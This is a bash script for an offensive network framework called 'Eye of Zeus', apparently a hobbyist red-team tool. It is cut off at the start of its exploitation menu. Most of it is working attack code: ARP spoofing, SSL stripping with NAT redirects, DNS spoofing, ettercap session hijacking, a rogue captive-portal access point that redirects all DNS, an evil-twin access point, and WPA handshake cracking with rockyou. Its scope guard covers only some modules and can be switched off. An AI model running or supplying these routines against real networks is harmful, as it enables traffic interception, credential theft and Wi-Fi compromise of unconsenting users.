#!/bin/bash
# Base colors (Debian theme)
DEBIAN_RED="\e[1;31m"              # Classic red for errors
DEBIAN_BLUE="\e[38;2;0;83;159m"    # #00539f - Debian blue  
DEBIAN_GREEN="\e[38;2;0;166;156m"  # #00a69c - Debian green
DEBIAN_PURPLE="\e[38;2;119;33;111m" # #77216f - Debian purple
DEBIAN_ORANGE="\e[38;2;255;102;0m" # #ff6600 - Debian orange

# Hyprland-style accents (modern, vibrant)
HYPR_CYAN="\e[38;2;64;206;255m"    # #40ceff - Hyprland cyan
HYPR_MAGENTA="\e[38;2;187;63;231m" # #bb3fe7 - Hyprland magenta
HYPR_YELLOW="\e[38;2;255;206;64m"  # #ffce40 - Hyprland yellow
HYPR_PINK="\e[38;2;255;119;198m"   # #ff77c6 - Hyprland pink

# Gradient colors (for headers)
GRADIENT_BLUE="\e[38;2;0;180;255m"
GRADIENT_PURPLE="\e[38;2;147;0;211m"
GRADIENT_PINK="\e[38;2;255;20;147m"

# Text styles
BOLD="\e[1m"
RESET="\e[0m"

# ─────────────────────────────────────────────────────────────────────────────
# Global state / configuration
# ─────────────────────────────────────────────────────────────────────────────
EOZ_VERSION="1.1.0"
EOZ_HOME="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOOT_DIR=""              # per-engagement output directory (set by init_loot)
SESSION_LOG=""           # session transcript path (set by init_loot)
SCOPE_FILE=""            # in-scope allowlist path (set by load_scope)
EOZ_NO_SCOPE="${EOZ_NO_SCOPE:-0}"

# Resources to unwind on exit (consumed by restore_all).
EOZ_PIDS=()              # background PIDs we spawned
EOZ_IPT_RULES=()         # nat-table rule specs we added
EOZ_MON_IFACES=()        # monitor-mode interfaces we started
EOZ_IP_FWD_CHANGED=0     # whether we enabled ip_forward

# ─────────────────────────────────────────────────────────────────────────────
# Interactive UI / animation helpers
# ─────────────────────────────────────────────────────────────────────────────

# Hide/show the cursor and always restore it on exit.
hide_cursor() { tput civis 2>/dev/null; }
show_cursor() { tput cnorm 2>/dev/null; }
trap 'restore_all; show_cursor' EXIT

# Typewriter effect: prints text one char at a time.
# Usage: type_text "message" [color] [delay]
type_text() {
    local text="$1"
    local color="${2:-$HYPR_CYAN}"
    local delay="${3:-0.008}"
    echo -ne "$color$BOLD"
    local i
    for (( i=0; i<${#text}; i++ )); do
        echo -ne "${text:$i:1}"
        sleep "$delay"
    done
    echo -e "$RESET"
}

# Braille spinner that runs while a background PID is alive.
# Usage: some_command & spin $! "Working..."
spin() {
    local pid="$1"
    local msg="${2:-Working...}"
    local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local i=0
    hide_cursor
    while kill -0 "$pid" 2>/dev/null; do
        i=$(( (i + 1) % ${#frames[@]} ))
        echo -ne "\r${HYPR_MAGENTA}${BOLD}${frames[$i]}${RESET} ${HYPR_CYAN}${msg}${RESET} "
        sleep 0.08
    done
    wait "$pid" 2>/dev/null
    local rc=$?
    if [ $rc -eq 0 ]; then
        echo -e "\r${DEBIAN_GREEN}${BOLD}[✓]${RESET} ${msg}          "
    else
        echo -e "\r${DEBIAN_RED}${BOLD}[✗]${RESET} ${msg}          "
    fi
    show_cursor
    return $rc
}

# Animated progress/loading bar.
# Usage: loading_bar "Initializing" [total_steps] [step_delay]
loading_bar() {
    local label="${1:-Loading}"
    local steps="${2:-30}"
    local delay="${3:-0.02}"
    local filled bar i pct
    hide_cursor
    for (( i=0; i<=steps; i++ )); do
        pct=$(( i * 100 / steps ))
        filled=$(( i * 30 / steps ))
        bar=$(printf '█%.0s' $(seq 1 "$filled"))
        bar+=$(printf '░%.0s' $(seq 1 $(( 30 - filled )) ))
        echo -ne "\r${HYPR_YELLOW}${BOLD}${label}${RESET} ${GRADIENT_BLUE}[${bar}]${RESET} ${HYPR_PINK}${pct}%%${RESET}"
        sleep "$delay"
    done
    echo ""
    show_cursor
}

# Prints a menu line with a small left-pointer "gesture" for flair.
menu_item() {
    local num="$1" text="$2" color="${3:-$HYPR_CYAN}"
    echo -e "  ${GRADIENT_PINK}${BOLD}❯${RESET} ${color}${BOLD}${num})${RESET} ${color}${text}${RESET}"
}

# Return the interface of the primary default route (first match only).
default_iface() {
    ip route show default 2>/dev/null | awk '/default/ {print $5; exit}'
}

# Return the gateway IP of the primary default route (first match only).
default_gateway() {
    ip route show default 2>/dev/null | awk '/default/ {print $3; exit}'
}

# ─────────────────────────────────────────────────────────────────────────────
# (1) Input validation — everything the user types flows into command strings
#     (msfconsole -x, shell), so validate before use.
# ─────────────────────────────────────────────────────────────────────────────
is_ip() {
    local ip="$1" o
    [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || return 1
    local IFS=.
    for o in $ip; do (( o >= 0 && o <= 255 )) || return 1; done
    return 0
}
is_cidr() {
    [[ "$1" =~ ^[0-9]+(\.[0-9]+){3}/[0-9]+$ ]] || return 1
    is_ip "${1%/*}" && (( ${1#*/} >= 0 && ${1#*/} <= 32 ))
}
is_ip_or_cidr() { is_ip "$1" || is_cidr "$1"; }
is_mac()   { [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; }
is_iface() { [[ "$1" =~ ^[A-Za-z0-9._-]+$ ]] && [ -e "/sys/class/net/$1" ]; }
is_port()  { [[ "$1" =~ ^[0-9]+$ ]] && (( $1 >= 1 && $1 <= 65535 )); }

# prompt_valid "message" validator_fn -> echoes a valid value on stdout,
# re-prompting until the validator accepts it. Prompts go to stderr so the
# value can be captured with $(...).
prompt_valid() {
    local msg="$1" validator="$2" val
    while true; do
        printf "%b" "${HYPR_YELLOW}${BOLD}${msg} ${RESET}" >&2
        read -r val
        if "$validator" "$val"; then printf '%s' "$val"; return 0; fi
        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Invalid ${validator#is_} value. Try again.${RESET}" >&2
    done
}

# ─────────────────────────────────────────────────────────────────────────────
# (2) Scope guard — refuse targets that are not on the engagement allowlist.
# ─────────────────────────────────────────────────────────────────────────────
load_scope() { SCOPE_FILE="${EOZ_SCOPE_FILE:-$EOZ_HOME/scope.txt}"; }

ip_to_int() {
    local IFS=. a b c d; read -r a b c d <<< "$1"
    echo $(( (a<<24) + (b<<16) + (c<<8) + d ))
}
ip_in_cidr() {
    local ip="$1" cidr="$2" base bits mask
    base="${cidr%/*}"; bits="${cidr#*/}"
    [ "$bits" -eq 0 ] && return 0
    mask=$(( (0xFFFFFFFF << (32 - bits)) & 0xFFFFFFFF ))
    [ $(( $(ip_to_int "$ip") & mask )) -eq $(( $(ip_to_int "$base") & mask )) ]
}
# Match a target (IP / BSSID / SSID) against scope.txt (IPs, CIDRs, MACs, names).
in_scope() {
    local t="$1" tnorm line entry
    tnorm="$(printf '%s' "$t" | tr 'A-F' 'a-f')"
    while IFS= read -r line || [ -n "$line" ]; do
        line="${line%%#*}"; line="$(printf '%s' "$line" | xargs 2>/dev/null)"
        [ -z "$line" ] && continue
        entry="$(printf '%s' "$line" | tr 'A-F' 'a-f')"
        if is_cidr "$line" && is_ip "$t"; then
            ip_in_cidr "$t" "$line" && return 0
        elif [ "$entry" = "$tnorm" ]; then
            return 0
        fi
    done < "$SCOPE_FILE"
    return 1
}
# Returns 0 if the caller may attack $1, non-zero if it must abort.
scope_guard() {
    local t="$1" a
    [ "$EOZ_NO_SCOPE" = "1" ] && return 0
    if [ ! -s "$SCOPE_FILE" ]; then
        printf "%b\n" "${HYPR_YELLOW}${BOLD}[!] No scope file ($SCOPE_FILE) — you are responsible for authorization.${RESET}" >&2
        printf "%b" "${HYPR_YELLOW}${BOLD}[?] Proceed against '$t' anyway? (y/N): ${RESET}" >&2
        read -r a; [[ "$a" =~ ^[Yy] ]] && return 0
        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Aborted: out of scope.${RESET}" >&2; return 1
    fi
    in_scope "$t" && return 0
    printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] '$t' is NOT in scope ($SCOPE_FILE). Refusing.${RESET}" >&2
    return 1
}

# ─────────────────────────────────────────────────────────────────────────────
# (3)(4) Session log + loot directory — one engagement folder per run.
# ─────────────────────────────────────────────────────────────────────────────
init_loot() {
    local base="${EOZ_LOOT_BASE:-$HOME/EyeOfZeus-loot}"
    LOOT_DIR="$base/$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$LOOT_DIR"/{scans,hashes,handshakes,creds,reports,logs}
    SESSION_LOG="$LOOT_DIR/logs/session.log"
    : > "$SESSION_LOG"
}
# loot <relative/path> -> absolute path inside the engagement folder.
loot() { printf '%s' "$LOOT_DIR/$1"; }
# save_result <category> <file>  copies an artifact into the loot folder.
save_result() {
    local cat="$1" src="$2"
    [ -z "$LOOT_DIR" ] && return 1
    mkdir -p "$LOOT_DIR/$cat"
    [ -e "$src" ] && cp -a "$src" "$LOOT_DIR/$cat/" 2>/dev/null
}
# Tee all output to the session log, stripping ANSI codes from the file copy.
start_session_log() {
    [ -n "$SESSION_LOG" ] || return 0
    exec > >(tee >(sed -u 's/\x1b\[[0-9;]*[A-Za-z]//g' >> "$SESSION_LOG")) 2>&1
}

# ─────────────────────────────────────────────────────────────────────────────
# (5) Interface picker — list real interfaces instead of typing "wlan0".
# ─────────────────────────────────────────────────────────────────────────────
# select_interface [wifi]  -> echoes chosen interface; menu printed to stderr.
select_interface() {
    local want="${1:-any}" ifaces=() dev i n wireless
    for dev in $(ls /sys/class/net 2>/dev/null); do
        [ "$dev" = "lo" ] && continue
        if [ "$want" = "wifi" ] && [ ! -d "/sys/class/net/$dev/wireless" ]; then continue; fi
        ifaces+=("$dev")
    done
    if [ ${#ifaces[@]} -eq 0 ]; then
        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] No matching interfaces found${RESET}" >&2; return 1
    fi
    printf "%b\n" "${HYPR_CYAN}${BOLD}Available interfaces:${RESET}" >&2
    for i in "${!ifaces[@]}"; do
        dev="${ifaces[$i]}"; wireless=""
        [ -d "/sys/class/net/$dev/wireless" ] && wireless=" (wifi)"
        printf "  %b\n" "${GRADIENT_PINK}${BOLD}$((i+1)))${RESET} ${dev}${wireless}" >&2
    done
    printf "%b" "${HYPR_YELLOW}${BOLD}[?] Select interface #: ${RESET}" >&2
    read -r n
    if [[ "$n" =~ ^[0-9]+$ ]] && [ "$n" -ge 1 ] && [ "$n" -le ${#ifaces[@]} ]; then
        printf '%s' "${ifaces[$((n-1))]}"; return 0
    fi
    printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Invalid selection${RESET}" >&2; return 1
}

# ─────────────────────────────────────────────────────────────────────────────
# (6) Per-action tool check — catches missing binaries and name drift.
# ─────────────────────────────────────────────────────────────────────────────
require_tool() {
    local cmd="$1" pkg="${2:-$1}"
    command -v "$cmd" >/dev/null 2>&1 && return 0
    printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Required tool '$cmd' not found.${RESET}" >&2
    printf "%b\n" "${HYPR_YELLOW}${BOLD}[!] Install it with: sudo apt install $pkg${RESET}" >&2
    return 1
}
# Resolve the pcapng converter across Kali versions (name changed over time).
hcx_convert_tool() {
    command -v hcxpcapngtool 2>/dev/null || command -v hcxpcaptool 2>/dev/null
}

# ─────────────────────────────────────────────────────────────────────────────
# (7) Cracking helpers — actually crack a capture instead of just saving it.
# ─────────────────────────────────────────────────────────────────────────────
pick_wordlist() {
    local wl="/usr/share/wordlists/rockyou.txt" w
    [ ! -f "$wl" ] && [ -f "$wl.gz" ] && gunzip -k "$wl.gz" 2>/dev/null
    printf "%b" "${HYPR_YELLOW}${BOLD}[?] Wordlist [${wl}]: ${RESET}" >&2
    read -r w; [ -n "$w" ] && wl="$w"
    if [ ! -f "$wl" ]; then
        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Wordlist not found: $wl${RESET}" >&2; return 1
    fi
    printf '%s' "$wl"
}
crack_22000() {
    local hashfile="$1" wl
    require_tool hashcat || return 1
    if [ ! -s "$hashfile" ]; then
        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] No hashes captured in $hashfile${RESET}"; return 1
    fi
    wl="$(pick_wordlist)" || return 1
    hashcat -m 22000 "$hashfile" "$wl"
}
crack_handshake() {
    local cap="$1" bssid="$2" wl
    require_tool aircrack-ng || return 1
    wl="$(pick_wordlist)" || return 1
    aircrack-ng -w "$wl" ${bssid:+-b "$bssid"} "$cap"
}
maybe_crack() {
    # maybe_crack 22000|handshake <file> [bssid]
    local kind="$1" f="$2" bssid="${3:-}" a
    printf "%b" "${HYPR_YELLOW}${BOLD}[?] Crack $f now? (y/N): ${RESET}"
    read -r a; [[ "$a" =~ ^[Yy] ]] || return 0
    case "$kind" in
        22000)     crack_22000 "$f" ;;
        handshake) crack_handshake "$f" "$bssid" ;;
    esac
}

# ─────────────────────────────────────────────────────────────────────────────
# (8) Single cleanup routine — everything unwinds through here (EXIT + Ctrl+C).
# ─────────────────────────────────────────────────────────────────────────────
track_pid()   { EOZ_PIDS+=("$1"); }
track_mon()   { EOZ_MON_IFACES+=("$1"); }
enable_ip_forward() { echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null; EOZ_IP_FWD_CHANGED=1; }
# add_nat_rule "<rule spec after -A>"  applies it now and records it for teardown.
add_nat_rule() { iptables -t nat -A $1 2>/dev/null; EOZ_IPT_RULES+=("$1"); }

restore_all() {
    local p r m
    for p in "${EOZ_PIDS[@]}"; do kill "$p" 2>/dev/null; done
    EOZ_PIDS=()
    for r in "${EOZ_IPT_RULES[@]}"; do iptables -t nat -D $r 2>/dev/null; done
    EOZ_IPT_RULES=()
    for m in "${EOZ_MON_IFACES[@]}"; do airmon-ng stop "$m" 2>/dev/null; done
    EOZ_MON_IFACES=()
    if [ "$EOZ_IP_FWD_CHANGED" = "1" ]; then
        echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
        EOZ_IP_FWD_CHANGED=0
    fi
}

# ─────────────────────────────────────────────────────────────────────────────
# (9) Reporting — roll the loot folder into a Markdown summary.
# ─────────────────────────────────────────────────────────────────────────────
generate_report() {
    if [ -z "$LOOT_DIR" ]; then
        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] No active engagement.${RESET}"; return 1
    fi
    local rpt="$LOOT_DIR/reports/report.md" d
    {
        echo "# Eye of Zeus Engagement Report"
        echo
        echo "- Generated: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "- Operator: $(whoami)@$(hostname 2>/dev/null)"
        echo "- Scope file: ${SCOPE_FILE:-none}"
        echo "- Loot directory: \`$LOOT_DIR\`"
        echo
        echo "## Collected artifacts"
        for d in scans hashes handshakes creds; do
            echo
            echo "### $d"
            if compgen -G "$LOOT_DIR/$d/*" >/dev/null 2>&1; then
                ( cd "$LOOT_DIR/$d" && ls -1 ) | sed 's/^/- /'
            else
                echo "- (none)"
            fi
        done
        echo
        echo "## Session log"
        echo "- \`$SESSION_LOG\`"
    } > "$rpt"
    printf "%b\n" "${DEBIAN_GREEN}${BOLD}[✓] Report written: $rpt${RESET}"
}

# ─────────────────────────────────────────────────────────────────────────────
# (10) CLI: help / version / self-update.
# ─────────────────────────────────────────────────────────────────────────────
show_version() { printf "%b\n" "${HYPR_CYAN}${BOLD}Eye of Zeus v${EOZ_VERSION}${RESET}"; }
show_help() {
    cat <<EOF
Eye of Zeus v${EOZ_VERSION} - network audit & penetration-testing framework

Usage: sudo ./Eye_Of_Zeus_2.sh [options]

Options:
  -h, --help          Show this help and exit
  -V, --version       Show version and exit
      --update        git pull the latest version and exit
      --scope FILE    Use FILE as the in-scope allowlist (IPs / CIDRs / BSSIDs)
      --no-scope      Disable scope enforcement (you accept responsibility)
      --loot DIR      Base directory for engagement output
EOF
}
self_update() {
    require_tool git || return 1
    if [ -d "$EOZ_HOME/.git" ]; then
        ( cd "$EOZ_HOME" && git pull --ff-only )
    else
        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Not a git checkout: $EOZ_HOME${RESET}"; return 1
    fi
}

# Function for modern headers
modern_header() {
    local text="$1"
    echo -e "\e[48;2;30;30;46m${BOLD}${HYPR_CYAN}"
    printf "╔════════════════════════════════════════════════════════════════════════════════╗\n"
    printf "║ %-72s ║\n" "$text"
    printf "╚════════════════════════════════════════════════════════════════════════════════╝\n"
    echo -e "${RESET}"
}

# Eye_Of_Zeus Banner with Cool Colors + power-on animation
banner() {
    clear
    # ASCII art revealed line-by-line for a subtle "power-on" sweep.
    local art=(
" ██████████                                  ███████       ██████            ███████████                            "
"░░███░░░░░█                                ███░░░░░███    ███░░███          ░█░░░░░░███                             "
" ░███  █ ░  █████ ████  ██████            ███     ░░███  ░███ ░░░           ░     ███░    ██████  █████ ████  █████ "
" ░██████   ░░███ ░███  ███░░███          ░███      ░███ ███████                  ███     ███░░███░░███ ░███  ███░░  "
" ░███░░█    ░███ ░███ ░███████           ░███      ░███ ░░░███░                 ███     ░███████  ░███ ░███ ░░█████ "
" ░███ ░   █ ░███ ░███ ░███░░░            ░░███     ███    ░███                ████     █░███░░░   ░███ ░███  ░░░░███"
" ██████████ ░░███████ ░░██████  █████████ ░░░███████░     █████     █████████ ███████████░░██████  ░░████████ ██████ "
"░░░░░░░░░░   ░░░░░███  ░░░░░░  ░░░░░░░░░    ░░░░░░░     ░░░░░     ░░░░░░░░░ ░░░░░░░░░░░  ░░░░░░    ░░░░░░░░ ░░░░░░  "
"             ███ ░███                                                                                               "
"            ░░██████                                                                                                "
"             ░░░░░░                                                                                                 "
    )
    hide_cursor
    echo -ne "\e[38;2;64;206;255m"  # Hyprland Cyan
    local line
    for line in "${art[@]}"; do
        echo "$line"
        sleep 0.015
    done
    echo -e "\e[0m"
    show_cursor
    echo -e "\e[38;2;0;180;255m╔════════════════════════════════════════════════════════════════════════════════╗\e[0m"
    echo -e "\e[38;2;0;180;255m║             E Y E   O F   Z E U S  -  Ultimate Attack Framework               ║\e[0m"
    echo -e "\e[38;2;0;180;255m╚════════════════════════════════════════════════════════════════════════════════╝\e[0m"
    echo -e "\e[38;2;147;0;211m╔════════════════════════════════════════════════════════════════════════════════╗\e[0m"
    echo -e "\e[38;2;147;0;211m║                  Author: arch_nexus707 | Theme: Debian/Hyprland               ║\e[0m"
    echo -e "\e[38;2;147;0;211m╚════════════════════════════════════════════════════════════════════════════════╝\e[0m"
    echo -e "\e[38;2;255;20;147m╔════════════════════════════════════════════════════════════════════════════════╗\e[0m"
    echo -e "\e[38;2;255;20;147m║           For Professional Red Team Operations | Use Responsibly              ║\e[0m"
    echo -e "\e[38;2;255;20;147m╚════════════════════════════════════════════════════════════════════════════════╝\e[0m"
    echo ""
}

# Check root
check_root() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${DEBIAN_RED}${BOLD}[✗] ERROR: This tool must be run as root${RESET}" >&2
        echo -e "${HYPR_YELLOW}${BOLD}[!] Try: sudo ./Eye_Of_Zeus_2.sh${RESET}"
        exit 1
    fi
}

# Dependencies check
check_dependencies() {
    echo -e "\n${HYPR_YELLOW}${BOLD}[🔄] Checking dependencies...${RESET}"
    # Map of "command:apt-package" so we probe the real binary but install the correct package.
    local deps=(
        "nmap:nmap"
        "bettercap:bettercap"
        "ettercap:ettercap-text-only"
        "tshark:tshark"
        "hydra:hydra"
        "msfconsole:metasploit-framework"
        "sslstrip:sslstrip"
        "dnsmasq:dnsmasq"
        "hostapd:hostapd"
        "macchanger:macchanger"
        "aircrack-ng:aircrack-ng"
        "reaver:reaver"
        "wireshark:wireshark"
        "curl:curl"
        "git:git"
        "python3:python3"
        "pip3:python3-pip"
    )
    local missing=()

    for entry in "${deps[@]}"; do
        local cmd="${entry%%:*}"
        local pkg="${entry##*:}"
        if ! command -v "$cmd" &> /dev/null; then
            missing+=("$pkg")
            echo -e "  ${DEBIAN_RED}✗${RESET} ${cmd} ${DEBIAN_RED}(pkg: ${pkg})${RESET}"
        else
            echo -e "  ${DEBIAN_GREEN}✓${RESET} ${cmd}"
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "\n${DEBIAN_RED}${BOLD}[!] Missing packages: ${missing[*]}${RESET}"
        echo -e "${HYPR_YELLOW}${BOLD}[*] Installing missing packages...${RESET}"
        apt-get update -qq & spin $! "Refreshing package lists"
        apt-get install -y "${missing[@]}" &>/dev/null & spin $! "Installing: ${missing[*]}"
        if [ $? -ne 0 ]; then
            echo -e "${DEBIAN_RED}${BOLD}[✗] Some packages failed to install. Install them manually and re-run.${RESET}"
        fi
    else
        echo -e "${DEBIAN_GREEN}${BOLD}[✓] All dependencies already installed${RESET}"
    fi

    # Install Python packages.
    # Modern Kali/Debian (PEP 668) block system-wide pip installs, so try the
    # Debian packages first, then fall back to pip with --break-system-packages.
    echo -e "\n${HYPR_YELLOW}${BOLD}[🔄] Checking Python packages...${RESET}"
    local py_pkgs=("python3-scapy" "python3-requests" "python3-bs4")
    if ! apt-get install -y "${py_pkgs[@]}" 2>/dev/null; then
        echo -e "${HYPR_YELLOW}${BOLD}[*] Falling back to pip (--break-system-packages)...${RESET}"
        if ! pip3 install --break-system-packages scapy requests beautifulsoup4; then
            echo -e "${DEBIAN_RED}${BOLD}[✗] Failed to install Python packages. Install scapy/requests/beautifulsoup4 manually.${RESET}"
        fi
    fi
    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Dependency check complete${RESET}"
}

# Network discovery
network_discovery() {
    banner
    modern_header "NETWORK DISCOVERY MODULE"
    echo -e "${HYPR_CYAN}${BOLD}1) Quick Scan (Ping Sweep)${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}2) Deep Scan (OS + Services)${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}3) ARP Scan (Local Network)${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}4) WiFi Scan (AP Discovery)${RESET}"
    echo -e "${DEBIAN_RED}${BOLD}5) Back to Main Menu${RESET}"
    echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
    read -r choice

    case $choice in
        1)
            require_tool nmap || return
            local network; network="$(prompt_valid "[?] Enter network range (e.g., 192.168.1.0/24):" is_ip_or_cidr)"
            echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting quick scan on $network...${RESET}"
            nmap -sn "$network" -oN "$(loot "scans/ping_sweep_$(date +%H%M%S).txt")"
            ;;
        2)
            require_tool nmap || return
            local network; network="$(prompt_valid "[?] Enter network range (e.g., 192.168.1.0/24):" is_ip_or_cidr)"
            echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting deep scan on $network...${RESET}"
            nmap -sS -sV -O -T4 "$network" -oN "$(loot "scans/deep_scan_$(date +%H%M%S).txt")"
            ;;
        3)
            require_tool arp-scan || return
            echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting ARP scan...${RESET}"
            arp-scan --localnet | tee "$(loot "scans/arp_scan_$(date +%H%M%S).txt")"
            ;;
        4)
            echo -e "${DEBIAN_BLUE}${BOLD}[*] Scanning for WiFi networks...${RESET}"
            nmcli dev wifi list | tee "$(loot "scans/wifi_scan_$(date +%H%M%S).txt")"
            ;;
        5)
            return
            ;;
        *)
            echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
            ;;
    esac
    echo -e "\n${HYPR_YELLOW}${BOLD}[↵] Press Enter to continue...${RESET}"
    read -r
}

# Advanced MITM attacks
mitm_attacks() {
    banner
    modern_header "MITM ATTACK MODULE"
    echo -e "${HYPR_CYAN}${BOLD}1) ARP Spoofing${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}2) DNS Spoofing${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}3) Advanced SSL Stripping${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}4) Session Hijacking${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}5) Captive Portal${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}6) Evil Twin (WiFi)${RESET}"
    echo -e "${DEBIAN_RED}${BOLD}7) Back to Main Menu${RESET}"
    echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
    read -r choice

    case $choice in
        1)
            require_tool arpspoof dsniff || return
            local target gateway; target="$(prompt_valid "[?] Enter target IP:" is_ip)"
            gateway="$(prompt_valid "[?] Enter gateway IP:" is_ip)"
            scope_guard "$target" || return
            local iface; iface="$(default_iface)"
            enable_ip_forward
            arpspoof -i "$iface" -t "$target" "$gateway" & track_pid $!
            arpspoof -i "$iface" -t "$gateway" "$target" & track_pid $!
            echo -e "${DEBIAN_GREEN}${BOLD}[✓] ARP spoofing started (Ctrl+C to stop and return to menu)${RESET}"
            trap 'restore_all; trap - INT; return' INT
            sleep infinity
            ;;
        2)
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
            read -r target
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter domain to spoof (e.g., *.google.com):${RESET}"
            read -r domain
            bettercap -iface "$(default_iface)" -eval "set arp.spoof.targets $target; set dns.spoof.all true; set dns.spoof.domains $domain; arp.spoof on; dns.spoof on"
            ;;
        3)
            echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Advanced SSL Stripping${RESET}"
            require_tool sslstrip || return
            require_tool arpspoof dsniff || return
            local target gateway; target="$(prompt_valid "[?] Enter target IP:" is_ip)"
            gateway="$(prompt_valid "[?] Enter gateway IP:" is_ip)"
            scope_guard "$target" || return
            local iface; iface="$(default_iface)"
            enable_ip_forward
            add_nat_rule "PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080"
            sslstrip -a -l 8080 & track_pid $!
            arpspoof -i "$iface" -t "$target" "$gateway" & track_pid $!
            arpspoof -i "$iface" -t "$gateway" "$target" & track_pid $!
            echo -e "${DEBIAN_GREEN}${BOLD}[✓] SSL stripping started (Ctrl+C to stop and return to menu)${RESET}"
            trap 'restore_all; trap - INT; return' INT
            sleep infinity
            ;;
        4)
            echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Session Hijacking${RESET}"
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
            read -r target
            ettercap -T -i "$(default_iface)" -M arp:remote "/$target//" "/$(default_gateway)//"
            ;;
        5)
            echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Captive Portal Attack${RESET}"
            require_tool dnsmasq || return
            require_tool hostapd || return
            local interface; interface="$(select_interface wifi)" || return
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter SSID for fake AP:${RESET}"
            read -r ssid
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter redirect URL:${RESET}"
            read -r url

            echo "interface=$interface
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1
server=8.8.8.8
address=/#/$url" > /tmp/dnsmasq.conf

            echo "interface=$interface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0" > /tmp/hostapd.conf

            ip addr flush dev "$interface" 2>/dev/null
            ifconfig "$interface" 192.168.1.1 netmask 255.255.255.0 up
            dnsmasq -C /tmp/dnsmasq.conf -d &
            hostapd -B /tmp/hostapd.conf
            echo -e "${DEBIAN_GREEN}${BOLD}[✓] Captive portal started on $ssid (Ctrl+C to stop and return to menu)${RESET}"
            trap 'pkill dnsmasq 2>/dev/null; pkill hostapd 2>/dev/null; ifconfig "$interface" down 2>/dev/null; restore_all; trap - INT; return' INT
            sleep infinity
            ;;
        6)
            echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Evil Twin Attack${RESET}"
            require_tool hostapd || return
            require_tool airmon-ng aircrack-ng || return
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target AP SSID:${RESET}"
            read -r target_ssid
            local interface; interface="$(select_interface wifi)" || return
            local channel; channel="$(prompt_valid "[?] Enter channel (1-165):" is_port)"

            # Capture the real monitor interface name from airmon-ng output
            # (it is not always "<iface>mon").
            local mon_iface
            mon_iface="$(airmon-ng start "$interface" | grep -oE '(monitor mode.*enabled.*on \[?[a-z0-9]+\]?[a-z0-9]*|\[phy[0-9]+\][a-z0-9]+)' | grep -oE '[a-z0-9]+mon|[a-z0-9]+$' | tail -1)"
            [ -z "$mon_iface" ] && mon_iface="${interface}mon"
            track_mon "$mon_iface"

            # Terse nmcli output avoids backslash-escaped colons in the BSSID.
            local target_bssid
            target_bssid="$(nmcli -t -f BSSID,SSID dev wifi | grep -F ":$target_ssid" | head -1 | sed 's/\\//g' | cut -d: -f1-6)"

            airodump-ng -c "$channel" --bssid "$target_bssid" "$mon_iface" &
            local dump_pid=$!
            sleep 10
            kill "$dump_pid" 2>/dev/null

            echo "interface=$mon_iface
driver=nl80211
ssid=$target_ssid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0" > /tmp/evil_twin.conf

            hostapd -B /tmp/evil_twin.conf
            echo -e "${DEBIAN_GREEN}${BOLD}[✓] Evil Twin AP started (Ctrl+C to stop and return to menu)${RESET}"
            trap 'pkill hostapd 2>/dev/null; restore_all; trap - INT; return' INT
            sleep infinity
            ;;
        7)
            return
            ;;
        *)
            echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
            ;;
    esac
}

# Exploitation module
exploitation() {
    banner
    modern_header "EXPLOITATION MODULE"
    echo -e "${HYPR_CYAN}${BOLD}1) SMB Exploits${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}2) RDP Exploits${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}3) Web Exploits${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}4) WiFi Exploits${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}5) Zero-Day Exploits${RESET}"
    echo -e "${DEBIAN_RED}${BOLD}6) Back to Main Menu${RESET}"
